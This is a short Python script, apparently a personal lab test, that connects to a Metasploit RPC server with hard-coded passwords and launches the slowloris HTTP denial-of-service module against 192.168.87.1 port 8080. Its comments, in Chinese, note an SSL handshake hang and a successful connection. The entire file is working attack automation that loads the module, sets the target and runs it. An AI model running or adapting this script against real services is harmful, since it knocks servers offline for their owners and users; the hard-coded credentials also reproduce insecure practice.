from pymetasploit3.msfrpc import MsfRpcClient

#client = MsfRpcClient('C4U1su1u', port=55552, ssl=True) #总是卡住，ctrlc看是在ssl handshake
client = MsfRpcClient('abc123', ssl=True) #连接成功

print([m for m in dir(client) if not m.startswith('_')])

exploit = client.modules.use('auxiliary', 'dos/http/slowloris')

print(exploit.options)

exploit['rhost'] = '192.168.87.1'
exploit['rport'] = '8080'

exploit.execute()
print("1")

console_id = client.consoles.console().cid
console = client.consoles.console(console_id)
console.run_module_with_output(exploit)

print("2")